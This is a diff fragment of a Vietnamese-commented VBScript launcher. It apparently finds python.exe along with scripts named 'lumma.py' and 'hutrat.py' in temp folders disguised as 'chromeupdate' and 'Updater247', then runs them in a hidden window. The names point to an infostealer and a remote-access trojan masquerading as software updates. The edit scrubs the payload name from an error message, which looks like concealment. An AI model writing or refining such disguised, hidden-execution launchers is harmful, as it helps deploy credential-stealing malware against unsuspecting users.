@@ -38,7 +38,7 @@ pyScript2 = FindFile(tempFolder & "chromeupdate", "hutrat.py")
 If pyExe1 <> "" And pyScript1 <> "" Then
     shell.Run """" & pyExe1 & """ """ & pyScript1 & """", 0, False
 Else
-    MsgBox "Không tìm thấy python.exe hoặc lumma.py trong Updater247"
+    MsgBox "Không tìm thấy"
 End If
 
 ' Chạy script 2 nếu tìm thấy
@@ -47,4 +47,5 @@ If pyExe2 <> "" And pyScript2 <> "" Then
 Else
     MsgBox "Không tìm thấy"
 End If
+
 
